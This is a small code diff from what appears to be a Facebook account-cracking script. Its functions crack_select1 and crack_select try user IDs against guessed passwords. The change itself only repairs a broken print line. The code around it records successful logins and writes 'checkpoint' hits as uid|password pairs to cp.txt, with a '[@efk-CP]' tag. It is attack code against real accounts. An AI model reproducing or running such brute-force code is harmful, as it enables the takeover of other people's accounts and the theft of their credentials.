@@ -1229,9 +1229,7 @@ def crack_select1():
 																		oks.append(uid+pass10)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [@efk-CP] "+uid+" | "+pass10+"\033
-
-[0;97m")
+																			print(" \033[1;33m [@efk-CP] "+uid+" | "+pass10+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass10+"\n")
 																			cp.close()
@@ -1539,9 +1537,7 @@ def crack_select():
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;33m [@efk-CP] "+uid+" | "+pass8+"\033
-
-[0;97m")
+																			print(" \033[1;33m [@efk-CP] "+uid+" | "+pass8+"\033[0;97m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
